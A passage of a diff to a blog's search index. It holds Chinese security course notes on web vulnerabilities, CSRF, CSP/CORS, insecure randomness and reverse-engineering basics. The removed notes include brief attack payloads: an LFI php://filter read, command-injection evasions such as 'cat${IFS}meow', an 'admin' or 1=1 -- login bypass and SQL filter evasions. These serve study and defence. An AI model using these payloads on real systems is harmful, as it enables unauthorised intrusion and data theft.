-</ul>
-</li>
-<li>副檔名大小寫混淆 <ul>
-<li>Php, PhP, pHP…</li>
-</ul>
-</li>
-<li>更改 Content-Type <ul>
-<li>image&#x2F;jpg</li>
-<li>image&#x2F;jpeg</li>
-<li>image&#x2F;png</li>
-</ul>
-</li>
-<li>改變file header</li>
-</ul>
-</li>
-</ul>
-<h3 id="Local-file-inclusion"><a href="#Local-file-inclusion" class="headerlink" title="Local file inclusion"></a>Local file inclusion</h3><ul>
-<li>PHP wrapper protocol - filter<ul>
-<li>將php引入為base64來逃避php解析</li>
-<li><code>php://filter/read=convert.base64-encode/resource=index.php</code></li>
-</ul>
-</li>
-</ul>
-<h3 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h3><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><ul>
-<li>反射型 (較容易攻擊</li>
-<li>儲存型 (更具威脅性</li>
-<li>DOM型</li>
-</ul>
-<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>injection  : 改變原始的語意</p>
-<ul>
-<li><p>Bash Operator</p>
-<ul>
-<li>;  – 結束指令並開始下一個指令</li>
-<li>|  – 將輸出傳遞給下一個指令</li>
-<li>&amp;  – 同時執行兩個指令(Windows)</li>
-<li>|| – 如果前一個指令執型失敗則執行</li>
-<li>&amp;&amp; – 如果前一個指令執行成功才執行</li>
-</ul>
-</li>
-<li><p>得知 injection 結果</p>
-<ul>
-<li>利用錯誤訊息得知 injection 結果</li>
-<li>利用 C2 Server 得知 injection 結果</li>
-</ul>
-</li>
-<li><p>Blackllist Evasion</p>
-<ul>
-<li>Space Evasion<ul>
-<li>cat${IFS}meow</li>
-</ul>
-</li>
-<li>CLRF Evasion<ul>
-<li>cat%0d%0ameow</li>
-</ul>
-</li>
-<li>Spilt Evasion<ul>
-<li>who$()ami</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>Command Substitution</p>
-<ul>
-<li>&#96;&#96; – 命令替換 可以執行一個命令 並作為參數輸出給外層命令</li>
-</ul>
-</li>
-</ul>
-<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="MySQL-Injection-必備語法知識-101"><a href="#MySQL-Injection-必備語法知識-101" class="headerlink" title="MySQL Injection 必備語法知識 101"></a>MySQL Injection 必備語法知識 101</h3><ul>
-<li>Information_schema：MySQL裡面的Wikipedia，存了所有相關DB, TABLE, COLUMNS的資訊</li>
-<li>SELECT 選取資料：像是 SELECT password FROM meow_table</li>
-<li>UNION 聯集選取：像是 SELECT fox FROM whale_table UNION SELECT password FROM meow_table，這樣的語法如果前面成立後面就不選，但如果是UNION ALL SELECT 就會強制執行，然後一起噴出來</li>
-<li>group_concat 串接資料：SELECT group_concat(password) FROM meow_table</li>
-</ul>
-<h3 id="一個最基礎的-SQL-Injection"><a href="#一個最基礎的-SQL-Injection" class="headerlink" title="一個最基礎的 SQL Injection"></a>一個最基礎的 SQL Injection</h3><blockquote>
-<p>WHERE username&#x3D;’<font color="FF0000">admin’ or 1&#x3D;1 --</font>‘ and password&#x3D;</p>
-</blockquote>
-<p>白色的部分是原本網站寫的驗證語法，紅色的部分代表攻擊者輸入的 Injection</p>
-<h3 id="Arbitrary-File-Read"><a href="#Arbitrary-File-Read" class="headerlink" title="Arbitrary File Read"></a>Arbitrary File Read</h3><ul>
-<li>MySQL - LOAD_FILE<ul>
-<li>SELECT “AAA” INTRO DUMPFILE “&#x2F;tmp&#x2F;a”</li>
-</ul>
-</li>
-</ul>
-<h3 id="BlackList-Evasion"><a href="#BlackList-Evasion" class="headerlink" title="BlackList Evasion"></a>BlackList Evasion</h3><ul>
-<li>Space Evasion<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT/**/1</span><br><span class="line">	SELECT(1),2,3</span><br><span class="line">	--%0F</span><br></pre></td></tr></table></figure></li>
-<li>Case Evasion<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION -&gt; union</span><br><span class="line">SELECT -&gt; select</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="Server-Side-Template-Injection"><a href="#Server-Side-Template-Injection" class="headerlink" title="Server-Side Template Injection"></a>Server-Side Template Injection</h2><p>伺服器端模板注入</p>
-<ul>
-<li>攻擊影響<ul>
-<li>所有網站的使用者</li>
-</ul>
-</li>
-</ul>
-<h3 id="What-is-Template"><a href="#What-is-Template" class="headerlink" title="What is Template"></a>What is Template</h3><p>讓網站的伺服器可以根據變數或資料，動態生成網頁內容</p>
-<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>伺服器請求偽造</p>
-<blockquote>
-<p>攻擊者對伺服器外網送 payload，透過外網取得內網的資訊。</p>
-</blockquote>
-<h3 id="HTTP-HTTPS"><a href="#HTTP-HTTPS" class="headerlink" title="HTTP&#x2F;HTTPS"></a>HTTP&#x2F;HTTPS</h3><p>發出一般的 HTTP 請求<br>企業開發軟體，wiki&#x2F;docs 放在內網</p>
-<h3 id="File"><a href="#File" class="headerlink" title="File"></a>File</h3><p>存取本地檔案<br>網站原始碼</p>
-<h3 id="Gopher"><a href="#Gopher" class="headerlink" title="Gopher"></a>Gopher</h3><p>送出 TCP Stream</p>
-<h2 id="Bind-Shell"><a href="#Bind-Shell" class="headerlink" title="Bind Shell"></a>Bind Shell</h2><p>攻擊者連接到受害者系統並執行命令</p>
-<h1 id="LLM"><a href="#LLM" class="headerlink" title="LLM"></a>LLM</h1><h2 id="transformer"><a href="#transformer" class="headerlink" title="transformer"></a>transformer</h2><p>encoder discoder<br><img src="https://hackmd.io/_uploads/SJnZQYn90.png" alt="image"></p>
-<h2 id="有名的LLM"><a href="#有名的LLM" class="headerlink" title="有名的LLM"></a>有名的LLM</h2><ul>
-<li>LLAMA</li>
-<li>百度-文言一心</li>
-</ul>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
-<li>向量維度</li>
-<li>position encoding</li>
-<li>self-attention：知道每個詞之間的相關性</li>
-<li>multiple attention：越多層AI越準確?</li>
-</ul>
-<p>透過已知文本猜測後面的結果</p>
-]]></content>
-      <categories>
-        <category>2024 AIS3 junior</category>
-      </categories>
-      <tags>
-        <tag>共筆筆記</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CyberSecurity Summer Camp 2024 資訊安全暑訓營-逆向工程</title>
-    <url>/2024/08/05/CyberSecurity-Summer-Camp-2024-%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8%E6%9A%91%E8%A8%93%E7%87%9F-%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/</url>
-    <content><![CDATA[<p><img src="https://i.imgur.com/fK2cMA6.png" alt="enter image description here"></p>
-<h2 id="課程筆記"><a href="#課程筆記" class="headerlink" title="課程筆記"></a>課程筆記</h2><h3 id="基礎-Linux-操作"><a href="#基礎-Linux-操作" class="headerlink" title="基礎 Linux 操作"></a>基礎 Linux 操作</h3><p><strong>終端機基礎操作</strong></p>
-<ul>
-<li>打開終端：通常可以通過快捷鍵 <code>Ctrl + Alt + T</code>。</li>
-</ul>
-<p><strong>命令行提示（Prompt）自定義</strong></p>
-<ul>
-<li>終端機上，可以⽤來輸入指令的地⽅</li>
-<li>指令執⾏結束後，會再次跳出 Prompt<ul>
-<li>此時才能繼續輸入下個指令</li>
-</ul>
-</li>
-</ul>
-<p><strong>快捷鍵操作</strong></p>
-<ul>
-<li>自動補全：輸入命令時按 <code>Tab</code> 鍵。</li>
-<li>歷史指令：使用上箭頭鍵訪問之前輸入的命令。</li>
-</ul>
-<p><strong>常用Linux命令示例</strong></p>
-<ul>
-<li>列出當前目錄下的文件和文件夾：<code>ls</code></li>
-<li>更改文件權限，例如給予所有用戶對文件的讀寫執行權限：<code>chmod 777 filename</code></li>
-<li>查看文件類型：<code>file filename</code></li>
-<li>下載文件：<code>wget http://example.com/file.txt</code></li>
-<li>顯示文件內容：<code>cat filename</code></li>
-<li>切換目錄：<code>cd /path/to/directory</code></li>
-<li>複製文件：<code>cp source_file destination_file</code></li>
-<li>移動或重命名文件：<code>mv old_name new_name</code></li>
-<li>刪除文件：<code>rm filename</code></li>
-<li>使用管道連接命令：<code>ls | grep &quot;pattern&quot;</code></li>
-</ul>
-<p><strong>文本編輯器 vim 使用</strong></p>
-<ul>
-<li>打開文件進行編輯：<code>vim filename</code></li>
-<li>保存並退出 vim：在 vim 的命令模式下輸入 <code>:wq</code></li>
-</ul>
-<h3 id="逆向工程簡介"><a href="#逆向工程簡介" class="headerlink" title="逆向工程簡介"></a>逆向工程簡介</h3><p><strong>逆向工程過程示例</strong></p>
-<ul>
-<li>反編譯程序：使用工具如 <code>objdump -d ./program</code></li>
-</ul>
-<h3 id="Linux-C-程式語言開發基礎"><a href="#Linux-C-程式語言開發基礎" class="headerlink" title="Linux C 程式語言開發基礎"></a>Linux C 程式語言開發基礎</h3><p><strong>C程式的編譯與執行</strong></p>
-<ul>
-<li>編譯 C 程式：<code>gcc -o output program.c</code></li>
-<li>執行編譯後的程式：<code>./output</code></li>
-</ul>
-<h3 id="Linux-執行檔分析"><a href="#Linux-執行檔分析" class="headerlink" title="Linux 執行檔分析"></a>Linux 執行檔分析</h3><p><strong>ELF文件格式分析</strong></p>
-<ul>
-<li>查看 ELF 程式頭：<code>readelf -l filename</code></li>
-</ul>
-<h3 id="解析組合語言"><a href="#解析組合語言" class="headerlink" title="解析組合語言"></a>解析組合語言</h3><p><strong>組合語言指令示例</strong></p>
-<ul>
-<li>移動數據：<code>mov eax, ebx</code></li>
-<li>減法操作：<code>sub eax, 5</code></li>
-<li>位運算 AND：<code>and eax, 0xFF</code></li>
-<li>條件跳轉如果相等：<code>je label</code></li>
-</ul>
-<h3 id="逆向工程實務"><a href="#逆向工程實務" class="headerlink" title="逆向工程實務"></a>逆向工程實務</h3><p><strong>逆向工程工具使用</strong></p>
-<ul>
-<li>使用 radare2 打開文件：<code>r2 ./binary</code></li>
-<li>使用 gdb 調試程式：<code>gdb ./program</code></li>
-</ul>
-]]></content>
-      <categories>
-        <category>資安課程</category>
-      </categories>
-      <tags>
-        <tag>逆向工程</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>AIS3 junior DAY3 下午-AI 應用安全實務 writeup</title>
     <url>/2024/08/18/AIS3-junior-DAY3-%E4%B8%8B%E5%8D%88-AI-%E6%87%89%E7%94%A8%E5%AE%89%E5%85%A8%E5%AF%A6%E5%8B%99/</url>
     <content><![CDATA[<h2 id="LLM-探討說話的藝術"><a href="#LLM-探討說話的藝術" class="headerlink" title="LLM 探討說話的藝術"></a>LLM 探討說話的藝術</h2><h3 id="感受GPTㄉ魔力吧"><a href="#感受GPTㄉ魔力吧" class="headerlink" title="感受GPTㄉ魔力吧"></a>感受GPTㄉ魔力吧</h3><p>code: </p>
@@ -1072,6 +901,105 @@
       </categories>
       <tags>
         <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CSP（內容安全策略）、SOP（同源策略）和CORS（跨源資源共享）</title>
+    <url>/2024/08/04/CSP%EF%BC%88%E5%85%A7%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%EF%BC%89%E3%80%81SOP%EF%BC%88%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%EF%BC%89%E5%92%8CCORS%EF%BC%88%E8%B7%A8%E6%BA%90%E8%B3%87%E6%BA%90%E5%85%B1%E4%BA%AB%EF%BC%89/</url>
+    <content><![CDATA[<h4 id="1-CSP（內容安全策略）"><a href="#1-CSP（內容安全策略）" class="headerlink" title="1. CSP（內容安全策略）"></a>1. CSP（內容安全策略）</h4><ul>
+<li>定義：CSP允許應用程序定義允許加載的內容來源，例如JavaScript、HTML框架和小程序。</li>
+<li>作用：防止跨站腳本攻擊、點擊劫持和其他內容注入。</li>
+<li>指令示例：<ul>
+<li>script-src：定義可以執行的腳本。</li>
+<li>form-action：列出表單提交的有效端點。</li>
+<li>child-src：定義嵌入框架允許的內容。</li>
+<li>object-src：限制Flash和其他插件的加載來源。</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-SOP（同源策略）"><a href="#2-SOP（同源策略）" class="headerlink" title="2. SOP（同源策略）"></a>2. SOP（同源策略）</h4><ul>
+<li>定義：SOP是一個安全機制，用於隔離不同來源的資源。</li>
+<li>工作原則：腳本在一個網站上執行時不能訪問另一個網站上的某些資源，例如Cookie。</li>
+<li>同源定義：協議、主機、端口的組合。</li>
+</ul>
+<h4 id="3-CORS（跨源資源共享）"><a href="#3-CORS（跨源資源共享）" class="headerlink" title="3. CORS（跨源資源共享）"></a>3. CORS（跨源資源共享）</h4><ul>
+<li>定義：CORS是一個允許通過特定的HTTP頭來覆蓋SOP的機制，使得資源（如API）可以跨域訪問。</li>
+<li>請求頭：客戶端在調用服務器時自動設置。</li>
+<li>響應頭示例：<ul>
+<li>Access-Control-Allow-Origin：指定可以訪問資源的URL。</li>
+<li>Access-Control-Allow-Methods：指定訪問資源時允許的方法。</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-安全漏洞的原因"><a href="#4-安全漏洞的原因" class="headerlink" title="4. 安全漏洞的原因"></a>4. 安全漏洞的原因</h4><ul>
+<li>CORS配置不當：例如，使用通配符*設置Access-Control-Allow-Origin，允許所有外部來源。</li>
+<li>CSP配置不當：例如，未正確設置child-src，允許加載惡意iframe。</li>
+</ul>
+<h4 id="5-安全漏洞的影響"><a href="#5-安全漏洞的影響" class="headerlink" title="5. 安全漏洞的影響"></a>5. 安全漏洞的影響</h4><ul>
+<li>私有API或應用程序資源可能暴露給所有外部來源，導致信息洩露或收入損失。</li>
+<li>內容注入可能導致跨站腳本攻擊或其他惡意內容注入。</li>
+</ul>
+<h4 id="6-預防措施"><a href="#6-預防措施" class="headerlink" title="6. 預防措施"></a>6. 預防措施</h4><ul>
+<li>CSP：<ul>
+<li>確定哪些資源應該能夠運行。</li>
+<li>為每個頁面明確指定資源。</li>
+<li>設置default-src。</li>
+<li>避免配置過於寬泛，不要使用通配符允許公共訪問。</li>
+</ul>
+</li>
+<li>CORS：<ul>
+<li>正確配置CORS頭，避免使用通配符，確保只有授權的來源可以訪問資源。</li>
+</ul>
+</li>
+</ul>
+<h4 id="7-結論"><a href="#7-結論" class="headerlink" title="7. 結論"></a>7. 結論</h4><ul>
+<li>通過正確配置CSP和CORS，可以顯著提高應用程序的安全性，防止多種網絡攻擊。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>安全達人養成計劃研習</category>
+      </categories>
+      <tags>
+        <tag>網路漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CSRF 攻擊</title>
+    <url>/2024/08/04/CSRF-%E6%94%BB%E6%93%8A/</url>
+    <content><![CDATA[<h1 id="跨站點請求偽造-CSRF-攻擊"><a href="#跨站點請求偽造-CSRF-攻擊" class="headerlink" title="跨站點請求偽造(CSRF 攻擊)"></a>跨站點請求偽造(CSRF 攻擊)</h1><ol>
+<li>CSRF 攻擊定義：<ul>
+<li>跨站請求偽造（CSRF）發生在第三方能夠欺騙用戶的網絡瀏覽器執行用戶當前已經驗證的網站上的操作。</li>
+</ul>
+</li>
+<li>CSRF 攻擊原因：<ul>
+<li>當具有可預測輸入欄位的網絡應用程序未檢查來自用戶瀏覽器的操作是否實際上是由用戶意圖的時候，就會發生 CSRF。</li>
+</ul>
+</li>
+<li>CSRF 攻擊後果：<ul>
+<li>成功的 CSRF 攻擊影響取決於應用程序的功能以及驗證受害者被允許執行的操作：更改密碼、購買商品、轉移資金、發布消息等。</li>
+</ul>
+</li>
+<li>CSRF 攻擊示例：<ul>
+<li>受害者登錄銀行網站，瀏覽器中設置了 bank.com 的 cookie。當受害者在未登出狀態下瀏覽攻擊者控制的網站時，該網站包含惡意腳本，利用受害者的當前會話執行惡意請求，銀行將錢轉移到攻擊者的帳戶中。</li>
+</ul>
+</li>
+<li>CSRF 攻擊預防措施：<ul>
+<li>應保護狀態改變操作，使用 CSRF 令牌。該令牌是一個安全、隨機的值，與用戶和會話相關聯。應作為隱藏字段添加到表單中，並在提交時由服務器檢查。或者，可以在敏感操作中實現重新驗證。</li>
+</ul>
+</li>
+<li>CSRF 攻擊預防錯誤：<ul>
+<li>驗證請求是否由用戶意圖執行。</li>
+<li>為每個請求附加 CSRF 令牌。令牌應該是長、獨特、隨機的，每個用戶和每個會話都不同。</li>
+<li>另外，對敏感操作實施挑戰-響應機制，如 CAPTCHA、一次性密碼或重新驗證。</li>
+</ul>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>安全達人養成計劃研習</category>
+      </categories>
+      <tags>
+        <tag>網路漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1284,38 +1212,75 @@
       </tags>
   </entry>
   <entry>
-    <title>不安全的密碼更改功能</title>
-    <url>/2024/08/04/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%AF%86%E7%A2%BC%E6%9B%B4%E6%94%B9%E5%8A%9F%E8%83%BD/</url>
-    <content><![CDATA[<ol>
-<li>漏洞定義：<ul>
-<li>不安全的密碼更改功能是一種認證漏洞，影響需要通過自助「更改密碼」功能創建新密碼的用戶。</li>
+    <title>CyberSecurity Summer Camp 2024 資訊安全暑訓營-逆向工程</title>
+    <url>/2024/08/05/CyberSecurity-Summer-Camp-2024-%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8%E6%9A%91%E8%A8%93%E7%87%9F-%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/</url>
+    <content><![CDATA[<p><img src="https://i.imgur.com/fK2cMA6.png" alt="enter image description here"></p>
+<h2 id="課程筆記"><a href="#課程筆記" class="headerlink" title="課程筆記"></a>課程筆記</h2><h3 id="基礎-Linux-操作"><a href="#基礎-Linux-操作" class="headerlink" title="基礎 Linux 操作"></a>基礎 Linux 操作</h3><p><strong>終端機基礎操作</strong></p>
+<ul>
+<li>打開終端：通常可以通過快捷鍵 <code>Ctrl + Alt + T</code>。</li>
+</ul>
+<p><strong>命令行提示（Prompt）自定義</strong></p>
+<ul>
+<li>終端機上，可以⽤來輸入指令的地⽅</li>
+<li>指令執⾏結束後，會再次跳出 Prompt<ul>
+<li>此時才能繼續輸入下個指令</li>
 </ul>
 </li>
-<li>風險解釋：<ul>
-<li>這種漏洞可能導致未經授權的密碼更改，從而導致帳戶被入侵。</li>
 </ul>
-</li>
-<li>漏洞風險：<ul>
-<li>當應用程序未能適當驗證用戶身份時，或者管理密碼更改功能被濫用，或者密碼更改過程中存在其他弱點時，就可能發生未經授權的密碼更改。</li>
+<p><strong>快捷鍵操作</strong></p>
+<ul>
+<li>自動補全：輸入命令時按 <code>Tab</code> 鍵。</li>
+<li>歷史指令：使用上箭頭鍵訪問之前輸入的命令。</li>
 </ul>
-</li>
-<li>漏洞示例：<ul>
-<li>攻擊者通過會話劫持獲得了受害者帳戶的訪問權限，並決定更改用戶的密碼。由於應用程序設計不安全，攻擊者不需要輸入當前密碼就可以更改並確認新密碼，從而輕易地獲得了受害者帳戶的控制權。</li>
+<p><strong>常用Linux命令示例</strong></p>
+<ul>
+<li>列出當前目錄下的文件和文件夾：<code>ls</code></li>
+<li>更改文件權限，例如給予所有用戶對文件的讀寫執行權限：<code>chmod 777 filename</code></li>
+<li>查看文件類型：<code>file filename</code></li>
+<li>下載文件：<code>wget http://example.com/file.txt</code></li>
+<li>顯示文件內容：<code>cat filename</code></li>
+<li>切換目錄：<code>cd /path/to/directory</code></li>
+<li>複製文件：<code>cp source_file destination_file</code></li>
+<li>移動或重命名文件：<code>mv old_name new_name</code></li>
+<li>刪除文件：<code>rm filename</code></li>
+<li>使用管道連接命令：<code>ls | grep &quot;pattern&quot;</code></li>
 </ul>
-</li>
-<li>預防措施：<ul>
-<li>開發人員應該檢查用戶ID是否未包含在請求中，並確保應用程序不使用此值來選擇將發生密碼更改的用戶。</li>
-<li>確保允許管理員更改用戶密碼的頁面需要適當的權限才能使用該功能。</li>
-<li>在進行密碼更改時要求身份驗證，要求用戶輸入他們當前的密碼以及新密碼。</li>
+<p><strong>文本編輯器 vim 使用</strong></p>
+<ul>
+<li>打開文件進行編輯：<code>vim filename</code></li>
+<li>保存並退出 vim：在 vim 的命令模式下輸入 <code>:wq</code></li>
 </ul>
-</li>
-</ol>
+<h3 id="逆向工程簡介"><a href="#逆向工程簡介" class="headerlink" title="逆向工程簡介"></a>逆向工程簡介</h3><p><strong>逆向工程過程示例</strong></p>
+<ul>
+<li>反編譯程序：使用工具如 <code>objdump -d ./program</code></li>
+</ul>
+<h3 id="Linux-C-程式語言開發基礎"><a href="#Linux-C-程式語言開發基礎" class="headerlink" title="Linux C 程式語言開發基礎"></a>Linux C 程式語言開發基礎</h3><p><strong>C程式的編譯與執行</strong></p>
+<ul>
+<li>編譯 C 程式：<code>gcc -o output program.c</code></li>
+<li>執行編譯後的程式：<code>./output</code></li>
+</ul>
+<h3 id="Linux-執行檔分析"><a href="#Linux-執行檔分析" class="headerlink" title="Linux 執行檔分析"></a>Linux 執行檔分析</h3><p><strong>ELF文件格式分析</strong></p>
+<ul>
+<li>查看 ELF 程式頭：<code>readelf -l filename</code></li>
+</ul>
+<h3 id="解析組合語言"><a href="#解析組合語言" class="headerlink" title="解析組合語言"></a>解析組合語言</h3><p><strong>組合語言指令示例</strong></p>
+<ul>
+<li>移動數據：<code>mov eax, ebx</code></li>
+<li>減法操作：<code>sub eax, 5</code></li>
+<li>位運算 AND：<code>and eax, 0xFF</code></li>
+<li>條件跳轉如果相等：<code>je label</code></li>
+</ul>
+<h3 id="逆向工程實務"><a href="#逆向工程實務" class="headerlink" title="逆向工程實務"></a>逆向工程實務</h3><p><strong>逆向工程工具使用</strong></p>
+<ul>
+<li>使用 radare2 打開文件：<code>r2 ./binary</code></li>
+<li>使用 gdb 調試程式：<code>gdb ./program</code></li>
+</ul>
 ]]></content>
       <categories>
-        <category>安全達人養成計劃研習</category>
+        <category>資安課程</category>
       </categories>
       <tags>
-        <tag>網路漏洞</tag>
+        <tag>逆向工程</tag>
       </tags>
   </entry>
   <entry>
@@ -1351,33 +1316,71 @@
       </tags>
   </entry>
   <entry>
-    <title>不安全的密碼術 - 隨機性不安全</title>
-    <url>/2024/08/04/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%AF%86%E7%A2%BC%E8%A1%93-%E9%9A%A8%E6%A9%9F%E6%80%A7%E4%B8%8D%E5%AE%89%E5%85%A8/</url>
+    <title>不安全的密碼術 - 對憑證的保護不足</title>
+    <url>/2024/08/04/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%AF%86%E7%A2%BC%E8%A1%93-%E5%B0%8D%E6%86%91%E8%AD%89%E7%9A%84%E4%BF%9D%E8%AD%B7%E4%B8%8D%E8%B6%B3/</url>
     <content><![CDATA[<ol>
-<li>什麼是不安全隨機性？<ul>
-<li>不安全隨機性是指在需要不可預測性的情境下，卻生成了可預測的值（“種子”）。</li>
+<li>漏洞定義：<ul>
+<li>「保護不足的憑證」漏洞指的是憑證未得到適當保護，這可能包括以純文本形式存儲或使用弱加密的憑證。</li>
 </ul>
 </li>
-<li>不安全隨機性的成因：<ul>
-<li>當用於安全敏感環境的函數能夠生成可預測的值時，就會發生不安全隨機性錯誤。</li>
+<li>漏洞風險：<ul>
+<li>如果攻擊者能夠訪問存儲憑證的地方，他們就能恢復這些憑證。</li>
 </ul>
 </li>
-<li>不安全隨機性的示例：<ul>
-<li>假設一個程序用於生成用戶密碼重置的隨機字符串，如果這個函數輸出的值是可預測的，攻擊者就能夠猜測或計算出用於用戶帳戶的值，進而重置密碼並訪問用戶帳戶。</li>
+<li>漏洞示例：<ul>
+<li>黑客組織針對一個允許企業主報告財務信息的網站發動攻擊，發現了該網站內容管理系統主題的多個漏洞，包括文件包含漏洞和目錄遍歷漏洞。</li>
 </ul>
 </li>
-<li>不安全隨機性的潛在風險：<ul>
-<li>攻擊者可能利用這些漏洞來計算或猜測應該保持秘密的任何序列，例如未經授權訪問敏感信息。</li>
+<li>攻擊過程：<ul>
+<li>利用這些漏洞，黑客能夠下載網站的基本配置文件，該文件包含了訪問數據庫的用戶名和密碼。</li>
 </ul>
 </li>
-<li>如何防止不安全隨機性漏洞：<ul>
-<li>開發人員應使用加密安全的隨機數生成器（Cryptographically Secure Pseudo-Random Number Generator，CSPRNG）。</li>
-<li>總是選擇經過充分測試、具有適當隨機性和不可預測種子長度的實現。</li>
+<li>漏洞後果：<ul>
+<li>黑客利用這些憑證訪問並更新用戶的財務設置和銀行詳細信息。</li>
+</ul>
+</li>
+<li>預防措施：<ul>
+<li>開發人員應該假設攻擊者將獲得對憑證存儲的訪問權，並確保憑證不被暴露。</li>
+<li>使用行業標準的安全機制或加密技術來保護憑證。</li>
+<li>尋找可能允許攻擊者訪問私鑰或密碼短語的任何信息。</li>
 </ul>
 </li>
 </ol>
-<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = sr.choice(xrange(<span class="number">0</span>, <span class="number">10000</span>))</span><br></pre></td></tr></table></figure>
-<p>SystemRandom 類別用於產生隨機數來設定密碼值。雖然涉及加密安全的 PRNG 演算法，但它只是一個 4 位數值。這樣的密碼太弱並且不能提供足夠的安全性。它既沒有字母數字也沒有特殊字符，也沒有足夠的長度。</p>
+]]></content>
+      <categories>
+        <category>安全達人養成計劃研習</category>
+      </categories>
+      <tags>
+        <tag>網路漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>不安全的密碼更改功能</title>
+    <url>/2024/08/04/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%AF%86%E7%A2%BC%E6%9B%B4%E6%94%B9%E5%8A%9F%E8%83%BD/</url>
+    <content><![CDATA[<ol>
+<li>漏洞定義：<ul>
+<li>不安全的密碼更改功能是一種認證漏洞，影響需要通過自助「更改密碼」功能創建新密碼的用戶。</li>
+</ul>
+</li>
+<li>風險解釋：<ul>
+<li>這種漏洞可能導致未經授權的密碼更改，從而導致帳戶被入侵。</li>
+</ul>
+</li>
+<li>漏洞風險：<ul>
+<li>當應用程序未能適當驗證用戶身份時，或者管理密碼更改功能被濫用，或者密碼更改過程中存在其他弱點時，就可能發生未經授權的密碼更改。</li>
+</ul>
+</li>
+<li>漏洞示例：<ul>
+<li>攻擊者通過會話劫持獲得了受害者帳戶的訪問權限，並決定更改用戶的密碼。由於應用程序設計不安全，攻擊者不需要輸入當前密碼就可以更改並確認新密碼，從而輕易地獲得了受害者帳戶的控制權。</li>
+</ul>
+</li>
+<li>預防措施：<ul>
+<li>開發人員應該檢查用戶ID是否未包含在請求中，並確保應用程序不使用此值來選擇將發生密碼更改的用戶。</li>
+<li>確保允許管理員更改用戶密碼的頁面需要適當的權限才能使用該功能。</li>
+<li>在進行密碼更改時要求身份驗證，要求用戶輸入他們當前的密碼以及新密碼。</li>
+</ul>
+</li>
+</ol>
 ]]></content>
       <categories>
         <category>安全達人養成計劃研習</category>
@@ -1415,6 +1418,42 @@
 </ul>
 </li>
 </ol>
+]]></content>
+      <categories>
+        <category>安全達人養成計劃研習</category>
+      </categories>
+      <tags>
+        <tag>網路漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>不安全的密碼術 - 隨機性不安全</title>
+    <url>/2024/08/04/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%AF%86%E7%A2%BC%E8%A1%93-%E9%9A%A8%E6%A9%9F%E6%80%A7%E4%B8%8D%E5%AE%89%E5%85%A8/</url>
+    <content><![CDATA[<ol>
+<li>什麼是不安全隨機性？<ul>
+<li>不安全隨機性是指在需要不可預測性的情境下，卻生成了可預測的值（“種子”）。</li>
+</ul>
+</li>
+<li>不安全隨機性的成因：<ul>
+<li>當用於安全敏感環境的函數能夠生成可預測的值時，就會發生不安全隨機性錯誤。</li>
+</ul>
+</li>
+<li>不安全隨機性的示例：<ul>
+<li>假設一個程序用於生成用戶密碼重置的隨機字符串，如果這個函數輸出的值是可預測的，攻擊者就能夠猜測或計算出用於用戶帳戶的值，進而重置密碼並訪問用戶帳戶。</li>
+</ul>
+</li>
+<li>不安全隨機性的潛在風險：<ul>
+<li>攻擊者可能利用這些漏洞來計算或猜測應該保持秘密的任何序列，例如未經授權訪問敏感信息。</li>
+</ul>
+</li>
+<li>如何防止不安全隨機性漏洞：<ul>
+<li>開發人員應使用加密安全的隨機數生成器（Cryptographically Secure Pseudo-Random Number Generator，CSPRNG）。</li>
+<li>總是選擇經過充分測試、具有適當隨機性和不可預測種子長度的實現。</li>
+</ul>
+</li>
+</ol>
+<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = sr.choice(xrange(<span class="number">0</span>, <span class="number">10000</span>))</span><br></pre></td></tr></table></figure>
+<p>SystemRandom 類別用於產生隨機數來設定密碼值。雖然涉及加密安全的 PRNG 演算法，但它只是一個 4 位數值。這樣的密碼太弱並且不能提供足夠的安全性。它既沒有字母數字也沒有特殊字符，也沒有足夠的長度。</p>
 ]]></content>
       <categories>
         <category>安全達人養成計劃研習</category>
@@ -1466,33 +1505,24 @@
       </tags>
   </entry>
   <entry>
-    <title>不安全的密碼術 - 對憑證的保護不足</title>
-    <url>/2024/08/04/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%AF%86%E7%A2%BC%E8%A1%93-%E5%B0%8D%E6%86%91%E8%AD%89%E7%9A%84%E4%BF%9D%E8%AD%B7%E4%B8%8D%E8%B6%B3/</url>
+    <title>大量賦值漏洞</title>
